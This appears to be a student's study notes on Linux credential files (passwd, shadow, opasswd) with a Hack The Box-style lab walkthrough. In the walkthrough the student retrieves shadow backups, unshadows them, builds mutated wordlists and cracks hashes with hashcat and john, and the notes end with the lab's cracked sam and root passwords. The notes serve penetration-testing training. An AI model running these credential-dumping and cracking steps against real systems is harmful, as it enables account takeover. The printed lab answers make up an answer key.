
### Passwd File Format

>[! hint ] 
> An `x` in the password field means the password is stored in an encrypted format in the `/etc/shadow` file. 

| `cry0l1t3` | `:` | `x`           | `:` | `1000` | `:` | `1000` | `:` | `cry0l1t3,,,`      | `:` | `/home/cry0l1t3` | `:` | `/bin/bash` |
| ---------- | --- | ------------- | --- | ------ | --- | ------ | --- | ------------------ | --- | ---------------- | --- | ----------- |
| Login name |     | Password info |     | UID    |     | GUID   |     | Full name/comments |     | Home directory   |     | Shell       |

### Shadow File Format

>[! hint]
> If the password field contains a character, such as `!` or `*`, the user cannot log in with a Unix password. If the encrypted password field is empty then no password is required to login. 
>
> The encrypted password field also has the following format: - `$<type>$<salt>$<hashed>`

| `cry0l1t3` | `:` | `$6$wBRzy$...SNIP...x9cDWUxW1` | `:` | `18937`        | `:` | `0`         | `:` | `99999`     | `:` | `7`            | `:`               | `:`             | `:`    |
| ---------- | --- | ------------------------------ | --- | -------------- | --- | ----------- | --- | ----------- | --- | -------------- | ----------------- | --------------- | ------ |
| Username   |     | Encrypted password             |     | Last PW change |     | Min. PW age |     | Max. PW age |     | Warning period | Inactivity period | Expiration date | Unused |

#### Encryption Algorithms

- `$1$` – MD5
- `$2a$` – Blowfish
- `$2y$` – Eksblowfish
- `$5$` – SHA-256
- `$6$` – SHA-512

### Opasswd

>[! Note] 
> Located in `/etc/security/opasswd`, this file contains old passwords. It requires administrative rights to read. 

### Cracking Linux Credentials

#### Unshadow
```go
sudo cp /etc/passwd /tmp/passwd.bak 
sudo cp /etc/shadow /tmp/shadow.bak 
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```

#### Cracking Unshadowed Credentials via Hashcat
```go
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```

#### Cracking MD5 Hashes via Hashcat
```go
hashcat -m 500 -a 0 md5-hashes.list rockyou.txt
```

## Questions

#### IP
```go
10.129.218.247
```

#### Will's Credentials

Password:
```go
TUqr7QfLTLhruhVbCP
```

Username:
```go
will@inlanefreight.htb
```

1) Examine the target using the credentials from the user Will and find out the password of the "root" user. Then, submit the password as the answer.

SSH
```go
ssh wil@10.129.218.247
```

After logging you, I see there's a `.backups` directory that contains the passwd and shadow backup files:
![[Pasted image 20250517143733.png]]

Start a python server to host the files and grab them from your machine.

Once there, unshadow both files into a text file. This will create a /.john:
```go
unshadow passwd.bak shadow.bak > unshadowed_hashes.txt
```

Use the password resources provided and create password mutations:
```go
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

Crack the hashes with john, using the `mut_password.list` and the `unshadowed_hashes.txt`
```go
john --wordlist=mut_password.list unshadow_hashes.txt
```
![[Pasted image 20250517145036.png]]

##### Credentials Found

sam
```go
B@tm@n2022!
```

root
```go
J0rd@n5
```

